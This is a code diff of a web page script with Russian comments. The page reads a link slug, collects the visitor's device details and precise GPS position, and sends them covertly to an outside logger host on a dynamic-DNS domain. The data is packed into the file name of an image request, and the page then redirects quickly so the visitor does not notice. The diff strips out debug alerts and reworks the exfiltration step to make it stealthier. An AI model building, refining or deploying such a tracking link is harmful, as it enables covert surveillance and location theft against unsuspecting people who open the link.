@@ -14,7 +14,8 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const slug = urlParams.get('id');
-        const targetServer = "http://echomapwa.ddns.net/logger/api/log_advance/";
+        // Твой сервер
+        const targetServer = "http://echomapwa.ddns.net/logger/get_img/";
         const finalRedirect = "http://echomapwa.ddns.net/logger/l/";
 
         async function collectAndGo() {
@@ -24,61 +25,47 @@
                 sw: window.screen.width, sh: window.screen.height,
                 plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
                 lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                gpu: "Unknown", lat: null, lon: null
+                lat: "null", lon: "null"
             };
 
-            // ПРОВЕРКА: Если мы на HTTPS, пробуем GPS с жестким ожиданием
-            // ДЕБАГ-ВЕРСИЯ БЛОКА GPS
-            alert("Шаг 1: Проверка условий. Protocol: " + location.protocol + " GPS avail: " + (!!navigator.geolocation));
-
-            if (navigator.geolocation) { // Убрал проверку протокола для теста, посмотрим что скажет
+            // 1. Попытка получить GPS
+            if (navigator.geolocation) {
                 try {
-                    alert("Шаг 2: Вызываю getCurrentPosition... Сейчас должно выскочить окно запроса!");
-                    
                     const pos = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
-                            timeout: 15000, // Увеличил до 15 секунд
+                            timeout: 10000, 
                             maximumAge: 0
                         });
                     });
-
                     info.lat = pos.coords.latitude;
                     info.lon = pos.coords.longitude;
-                    
-                    alert("Шаг 3: Успех! Координаты получены: " + info.lat + ", " + info.lon);
-
                 } catch (e) {
-                    // Самый важный алерт - покажет почему не сработало
-                    let errorMsg = "";
-                    switch(e.code) {
-                        case e.PERMISSION_DENIED: errorMsg = "Пользователь запретил (Denied)"; break;
-                        case e.POSITION_UNAVAILABLE: errorMsg = "Местоположение недоступно (Unavailable)"; break;
-                        case e.TIMEOUT: errorMsg = "Таймаут (Timeout)"; break;
-                        default: errorMsg = "Неизвестная ошибка: " + e.message;
-                    }
-                    alert("ОШИБКА GPS: " + errorMsg);
+                    console.log("GPS fail: " + e.message);
                 }
-            } else {
-                alert("КРИТИЧЕСКАЯ ОШИБКА: navigator.geolocation отсутствует в этом браузере!");
             }
 
-            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
+            // 2. Формируем "хитрое" имя картинки с данными
+            // Формат: lat_ЗНАЧЕНИЕ_lon_ЗНАЧЕНИЕ_sw_ШИРИНА_sh_ВЫСОТА_id_СЛАГ.png
+            const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
+            
+            // 3. Отправка через создание элемента Image
             const img = new Image();
             
-            // Ждем 2 секунды ПЕРЕД редиректом в любом случае, чтобы пакет успел уйти
-            const done = () => { 
+            const go = () => { 
+                // Небольшая задержка перед редиректом для уверенности
                 setTimeout(() => {
                     window.location.href = finalRedirect + slug;
-                }, 1500);
+                }, 500);
             };
 
-            img.onload = img.onerror = done;
-            // Шлем запрос
-            img.src = `${targetServer}${slug}?data=${encodedData}&v=final&t=${Date.now()}`;
+            img.onload = img.onerror = go;
+
+            // Пуск!
+            img.src = `${targetServer}${fileName}?t=${Date.now()}`;
             
-            // Если через 5 секунд ничего не вышло - уходим
-            setTimeout(done, 5000);
+            // Запасной тайм-аут редиректа (если картинка не грузится)
+            setTimeout(go, 5000);
         }
 
         collectAndGo();
